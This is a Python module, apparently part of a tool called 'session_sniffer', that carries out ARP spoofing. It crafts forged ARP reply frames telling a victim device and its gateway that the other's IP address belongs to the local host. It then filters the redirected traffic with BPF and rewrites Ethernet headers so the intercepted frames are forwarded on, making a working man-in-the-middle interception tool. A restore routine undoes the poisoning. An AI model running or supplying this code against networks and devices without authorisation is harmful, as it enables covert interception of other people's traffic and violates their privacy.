"""ARP packet construction and MAC address resolution.

This module provides low-level ARP operations for crafting spoofed ARP reply
frames and resolving IP addresses to MAC addresses using SendARP on Windows or
the ARP cache on Linux.
"""

import ctypes
import logging
import socket
import struct
import sys
import time
from ctypes import wintypes
from dataclasses import dataclass
from typing import TYPE_CHECKING

from session_sniffer.capture.exceptions import ArpResolutionError
from session_sniffer.networking.ctypes_adapters_info import iterate_ipv4_neighbors

if TYPE_CHECKING:
    from session_sniffer.capture.pcap import PcapHandle

logger = logging.getLogger(__name__)

# ARP constants
_ARP_HARDWARE_TYPE_ETHERNET = 1
_ARP_PROTOCOL_TYPE_IPV4 = 0x0800
_ARP_HARDWARE_ADDRESS_LENGTH = 6
_ARP_PROTOCOL_ADDRESS_LENGTH = 4
_ARP_OPCODE_REPLY = 2
_ETHERTYPE_ARP = 0x0806
_ETHERNET_MINIMUM_FRAME_LENGTH = 60

_BROADCAST_MAC = b'\xff\xff\xff\xff\xff\xff'


_ETHERTYPE_IPV4_BYTES = b'\x08\x00'
_MINIMUM_IPV4_FRAME_LENGTH = 34


@dataclass(frozen=True, slots=True)
class ArpSpoofTargets:
    """Target device and gateway address pairing for ARP spoofing."""

    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str


def mac_string_to_bytes(mac_string: str) -> bytes:
    """Convert a MAC address string (e.g. `AA:BB:CC:DD:EE:FF`) to 6 raw bytes."""
    return bytes(int(octet, 16) for octet in mac_string.replace('-', ':').split(':'))


def _mac_bytes_to_string(mac_bytes: bytes) -> str:
    """Convert 6 raw MAC bytes to a colon-separated hex string."""
    return ':'.join(f'{byte:02x}' for byte in mac_bytes)


def _resolve_mac_address_linux(ip_address: str) -> str:
    """Resolve an IPv4 address to its MAC address on Linux."""
    for _interface_index, cached_ip, cached_mac in iterate_ipv4_neighbors():
        if cached_ip == ip_address and cached_mac and cached_mac.upper() not in {'00:00:00:00:00:00', 'FF:FF:FF:FF:FF:FF'}:
            return cached_mac.lower()

    try:
        probe_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        probe_socket.settimeout(0.5)
        probe_socket.sendto(b'', (ip_address, 80))
        probe_socket.close()
    except OSError as e:
        logger.debug('UDP probe to %s failed: %s', ip_address, e)

    time.sleep(0.1)

    for _interface_index, cached_ip, cached_mac in iterate_ipv4_neighbors():
        if cached_ip == ip_address and cached_mac and cached_mac.upper() not in {'00:00:00:00:00:00', 'FF:FF:FF:FF:FF:FF'}:
            return cached_mac.lower()

    raise ArpResolutionError(ip_address, 'Host not found in Linux ARP table')


def resolve_mac_address(ip_address: str, source_ip: str | None = None) -> str:
    """Resolve an IPv4 address to its MAC address using SendARP on Windows or the ARP table on Linux.

    Args:
        ip_address: The target IPv4 address to resolve.
        source_ip: Optional source IPv4 address of the local adapter to query from.

    Returns:
        The resolved MAC address as a colon-separated hex string.

    Raises:
        ArpResolutionError: If the MAC address cannot be resolved.
    """
    if sys.platform != 'win32':
        return _resolve_mac_address_linux(ip_address)
    try:
        destination_ip = wintypes.DWORD(struct.unpack('<I', socket.inet_aton(ip_address))[0])
    except OSError as e:
        raise ArpResolutionError(ip_address, f'Invalid IP address: {e}') from e

    source_ip_dword = wintypes.DWORD(0)
    if source_ip is not None:
        try:
            source_ip_dword = wintypes.DWORD(struct.unpack('<I', socket.inet_aton(source_ip))[0])
        except OSError as e:
            logger.debug('Failed to convert source IP %s: %s', source_ip, e)
            source_ip_dword = wintypes.DWORD(0)

    # Allocate 8 bytes for physical address buffer as mandated by MSDN (at least two ULONGs)
    mac_address_buffer = (ctypes.c_ubyte * 8)()
    mac_address_length = wintypes.DWORD(6)

    iphlpapi = ctypes.windll.iphlpapi
    iphlpapi.SendARP.argtypes = [
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.c_void_p,
        ctypes.POINTER(wintypes.DWORD),
    ]
    iphlpapi.SendARP.restype = wintypes.DWORD

    last_error_code = 0
    for attempt in range(3):
        mac_address_length.value = 6
        result = iphlpapi.SendARP(
            destination_ip,
            source_ip_dword,
            ctypes.byref(mac_address_buffer),
            ctypes.byref(mac_address_length),
        )
        if not result:
            return _mac_bytes_to_string(bytes(mac_address_buffer[:6]))

        last_error_code = result
        # If source_ip_dword was non-zero and failed, try falling back to 0 on subsequent attempts
        if source_ip_dword.value and not attempt:
            source_ip_dword = wintypes.DWORD(0)
        time.sleep(0.2)

    # Fallback to local ARP cache if SendARP was unable to resolve
    for _interface_index, cached_ip, cached_mac in iterate_ipv4_neighbors():
        if cached_ip == ip_address and cached_mac and cached_mac.upper() not in {'00:00:00:00:00:00', 'FF:FF:FF:FF:FF:FF'}:
            logger.debug('Found %s in Windows neighbor cache: %s', ip_address, cached_mac)
            return cached_mac.lower()

    raise ArpResolutionError(ip_address, f'SendARP returned error code {last_error_code}')


def build_arp_reply(
    sender_mac: bytes,
    sender_ip: str,
    target_mac: bytes,
    target_ip: str,
) -> bytes:
    """Construct a complete Ethernet + ARP reply frame.

    The resulting 42-byte frame can be sent directly via `PcapHandle.send_packet()`.

    Args:
        sender_mac: 6-byte MAC address of the ARP reply sender (the spoofing host).
        sender_ip: IPv4 address the sender claims to own (the IP being spoofed).
        target_mac: 6-byte MAC address of the ARP reply target (the victim).
        target_ip: IPv4 address of the target machine.

    Returns:
        The raw 42-byte Ethernet + ARP frame.
    """
    sender_ip_bytes = socket.inet_aton(sender_ip)
    target_ip_bytes = socket.inet_aton(target_ip)

    # Ethernet header: dst_mac(6) + src_mac(6) + ethertype(2)
    ethernet_header = struct.pack(
        '!6s6sH',
        target_mac,
        sender_mac,
        _ETHERTYPE_ARP,
    )

    # ARP payload: htype(2) + ptype(2) + hlen(1) + plen(1) + opcode(2)
    #              + sender_mac(6) + sender_ip(4) + target_mac(6) + target_ip(4)
    arp_payload = struct.pack(
        '!HHBBH6s4s6s4s',
        _ARP_HARDWARE_TYPE_ETHERNET,
        _ARP_PROTOCOL_TYPE_IPV4,
        _ARP_HARDWARE_ADDRESS_LENGTH,
        _ARP_PROTOCOL_ADDRESS_LENGTH,
        _ARP_OPCODE_REPLY,
        sender_mac,
        sender_ip_bytes,
        target_mac,
        target_ip_bytes,
    )

    frame = ethernet_header + arp_payload
    if len(frame) < _ETHERNET_MINIMUM_FRAME_LENGTH:
        frame = frame.ljust(_ETHERNET_MINIMUM_FRAME_LENGTH, b'\x00')

    return frame


def send_arp_spoof_packets(
    pcap_handle: PcapHandle,
    host_mac: str,
    targets: ArpSpoofTargets,
) -> None:
    """Send spoofed ARP replies to redirect traffic through this host.

    Sends two targeted ARP reply frames:
    1. To the gateway: claiming that `targets.target_ip` is at `host_mac`
       (so the gateway sends traffic destined for `targets.target_ip` to this host)
    2. To the target: claiming that `targets.gateway_ip` is at `host_mac`
       (so the target sends traffic destined for the gateway to this host)

    Args:
        pcap_handle: An open pcap handle on the target interface.
        host_mac: MAC address of the local interface (the spoofing PC).
        targets: Target device and gateway address pairing.
    """
    host_mac_bytes = mac_string_to_bytes(host_mac)
    target_mac_bytes = mac_string_to_bytes(targets.target_mac)
    gateway_mac_bytes = mac_string_to_bytes(targets.gateway_mac)

    # Tell the gateway: "target_ip is at host_mac"
    frame_to_gateway = build_arp_reply(
        sender_mac=host_mac_bytes,
        sender_ip=targets.target_ip,
        target_mac=gateway_mac_bytes,
        target_ip=targets.gateway_ip,
    )
    pcap_handle.send_packet(frame_to_gateway)

    # Tell the target device: "gateway_ip is at host_mac"
    frame_to_target = build_arp_reply(
        sender_mac=host_mac_bytes,
        sender_ip=targets.gateway_ip,
        target_mac=target_mac_bytes,
        target_ip=targets.target_ip,
    )
    pcap_handle.send_packet(frame_to_target)


def send_arp_restore_packets(
    pcap_handle: PcapHandle,
    targets: ArpSpoofTargets,
    repeat_count: int = 3,
) -> None:
    """Send genuine ARP replies to restore normal routing between target and gateway.

    Args:
        pcap_handle: An open pcap handle on the target interface.
        targets: Target device and gateway address pairing.
        repeat_count: Number of times to send each restore frame.
    """
    target_mac_bytes = mac_string_to_bytes(targets.target_mac)
    gateway_mac_bytes = mac_string_to_bytes(targets.gateway_mac)

    # Restore gateway ARP table: "target_ip is at target_mac"
    frame_to_gateway = build_arp_reply(
        sender_mac=target_mac_bytes,
        sender_ip=targets.target_ip,
        target_mac=gateway_mac_bytes,
        target_ip=targets.gateway_ip,
    )

    # Restore target ARP table: "gateway_ip is at gateway_mac"
    frame_to_target = build_arp_reply(
        sender_mac=gateway_mac_bytes,
        sender_ip=targets.gateway_ip,
        target_mac=target_mac_bytes,
        target_ip=targets.target_ip,
    )

    for _ in range(repeat_count):
        pcap_handle.send_packet(frame_to_gateway)
        pcap_handle.send_packet(frame_to_target)


def build_arp_spoof_bpf_filter(host_mac: str, targets: ArpSpoofTargets) -> str:
    """Build a BPF filter string matching IPv4 traffic redirected by ARP spoofing.

    Matches:
    1. Outbound traffic from the target device directed to our host MAC.
    2. Inbound traffic from the gateway destined to the target IP directed to our host MAC.

    Args:
        host_mac: MAC address of the local spoofing host.
        targets: Target device and gateway address pairing.

    Returns:
        BPF filter expression for Npcap packet capture.
    """
    normalized_host_mac = host_mac.replace('-', ':').lower()
    normalized_target_mac = targets.target_mac.replace('-', ':').lower()
    normalized_gateway_mac = targets.gateway_mac.replace('-', ':').lower()
    return (
        f'ip and ether dst {normalized_host_mac} and ('
        f'(ether src {normalized_target_mac}) or '
        f'(ether src {normalized_gateway_mac} and dst host {targets.target_ip})'
        ')'
    )


def forward_intercepted_frame(
    raw_frame: bytes,
    *,
    host_mac_bytes: bytes,
    target_mac_bytes: bytes,
    target_ip_bytes: bytes,
    gateway_mac_bytes: bytes,
) -> bytes | None:
    """Rewrite Ethernet L2 headers to forward intercepted packets between target and gateway.

    If the frame was sent by the target device to the host MAC:
    - Destination MAC is rewritten to the gateway MAC.
    - Source MAC is rewritten to the host MAC.

    If the frame was sent by the gateway to the host MAC for the target IP:
    - Destination MAC is rewritten to the target MAC.
    - Source MAC is rewritten to the host MAC.

    Args:
        raw_frame: The raw link-layer frame received from pcap.
        host_mac_bytes: 6-byte MAC address of the local interface.
        target_mac_bytes: 6-byte MAC address of the target device.
        target_ip_bytes: 4-byte IPv4 address of the target device.
        gateway_mac_bytes: 6-byte MAC address of the default gateway.

    Returns:
        The rewritten frame `bytes` ready for injection via `PcapHandle.send_packet()`,
        or `None` if the frame does not qualify for forwarding.
    """
    if len(raw_frame) < _MINIMUM_IPV4_FRAME_LENGTH:
        return None

    # Check EtherType == 0x0800 (IPv4)
    if raw_frame[12:14] != _ETHERTYPE_IPV4_BYTES:
        return None

    # Frame must be addressed to the host MAC
    if raw_frame[0:6] != host_mac_bytes:
        return None

    source_mac = raw_frame[6:12]

    # Outbound packet: Target -> Host MAC (intended for Gateway)
    if source_mac == target_mac_bytes:
        return gateway_mac_bytes + host_mac_bytes + raw_frame[12:]

    # Inbound packet: Gateway -> Host MAC (intended for Target IP)
    if source_mac == gateway_mac_bytes and raw_frame[30:34] == target_ip_bytes:
        return target_mac_bytes + host_mac_bytes + raw_frame[12:]

    return None
